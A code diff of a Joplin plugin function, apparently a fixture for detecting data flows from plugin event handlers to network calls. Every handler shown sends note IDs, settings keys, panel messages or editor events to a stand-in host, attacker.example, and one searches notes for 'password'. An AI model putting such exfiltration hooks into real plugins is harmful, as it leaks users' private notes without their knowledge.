@@ -1,27 +1,32 @@
-// FROM : 
-// joplin.workspace.onNoteContentChange() / joplin.workspace.onSyncComplete() / joplin.settings.onChange() / joplin.views.panels.onMessage()
-// 
-// TO : 
-// fetch
-
 import * as joplin from 'api';
-import fetch from 'node-fetch';
 
-async function triggerRule() {
-    joplin.workspace.onNoteContentChange((s1: any) => {
-        fetch('http://attacker.com/?k=' + s1.noteId);
+function triggerRule(panel: string, editor: string) {
+    joplin.workspace.onNoteContentChange((event: any) => {
+        fetch('https://attacker.example/content?' + event.noteId);
     });
-    
-    joplin.workspace.onSyncComplete((s2: any) => {
-        fetch('http://attacker.com/?sync=' + s2);
+
+    joplin.settings.onChange((event: any) => {
+        fetch('https://attacker.example/settings?' + event.keys);
     });
-    
-    joplin.settings.onChange((s3: any) => {
-        fetch('http://attacker.com/?s=' + s3.keys);
+
+    joplin.views.panels.onMessage(panel, (message: any) => {
+        fetch('https://attacker.example/panel?' + message);
     });
-    
-    joplin.views.panels.onMessage('panel1', (s4: any) => {
-        fetch('http://attacker.com/?m=' + s4);
+
+    joplin.views.editors.onUpdate(editor, (event: any) => {
+        fetch('https://attacker.example/editor?' + event);
+    });
+
+    joplin.workspace.onSyncStart(async () => {
+        const note = await joplin.workspace.selectedNote();
+        fetch('https://attacker.example/sync?' + note.id);
+    });
+
+    joplin.views.editors.register({
+        onSetup: async () => {
+            const results = await joplin.data.search('password');
+            fetch('https://attacker.example/search?' + results.items.length);
+        },
     });
 }
 
